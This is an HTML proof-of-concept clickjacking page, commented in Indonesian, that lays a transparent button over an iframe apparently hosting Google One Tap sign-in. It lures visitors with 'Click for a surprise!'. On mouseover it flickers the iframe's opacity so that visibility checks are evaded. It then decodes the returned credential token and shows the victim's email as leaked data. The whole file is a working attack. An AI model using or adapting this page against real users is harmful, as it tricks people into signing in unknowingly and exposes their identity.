<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>High-Agression Clickjacking</title>
    <style>
        body { margin: 0; padding: 20px; font-family: sans-serif; }
        
        /* Iframe berisi Google One Tap */
        #target-frame {
            width: 400px;
            height: 150px;
            border: 1px solid #ccc;
            transition: opacity 0.01s; /* Transisi instan */
            opacity: 1;
        }

        /* Tombol jebakan di atas iframe */
        #trap-btn {
            position: absolute;
            top: 25px; /* Sesuaikan agar pas dengan posisi tombol login */
            left: 25px; 
            width: 350px;
            height: 60px;
            z-index: 999;
            background: transparent; /* Transparan agar korban tidak curiga */
            cursor: pointer;
            border: none;
        }
    </style>
</head>
<body>
    <h3>Click for a surprise!</h3>
    
    <div style="position: relative;">
        <button id="trap-btn" onmouseover="startAttack()"></button>
        <iframe id="target-frame" src="target.html"></iframe>
    </div>

    <div id="res" style="margin-top: 20px; font-weight: bold;"></div>

    <script>
        function startAttack() {
            const frame = document.getElementById("target-frame");
            // Melakukan "hammering" pada opacity agar IntersectionObserver bingung
            let count = 0;
            let interval = setInterval(() => {
                frame.style.opacity = (count % 2 === 0) ? '0.01' : '0.02';
                count++;
                if (count > 50) clearInterval(interval); // Berhenti setelah 50 kali perubahan
            }, 5); 
        }

        window.onmessage = (e) => {
            if (e.data && e.data.credential) {
                const payload = JSON.parse(atob(e.data.credential.split('.')[1]));
                document.getElementById('res').innerText = "DATA BOCOR: " + payload.email;
            }
        };
    </script>
</body>
</html>
